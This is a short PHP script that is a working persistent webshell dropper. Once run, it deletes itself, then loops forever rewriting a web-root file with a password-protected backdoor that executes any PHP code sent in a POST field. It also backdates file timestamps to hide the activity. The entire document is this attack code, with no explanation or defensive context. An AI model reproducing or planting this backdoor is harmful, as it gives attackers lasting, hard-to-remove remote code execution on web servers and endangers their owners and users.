<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '/var/www/html/-index.php';
    $code = '<?php if(md5($_GET["pass"])==="1a50a7026b30cd2c927487b2da37ec0e"){@eval($_POST["cmd"]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
        usleep(5000);
    }

?>


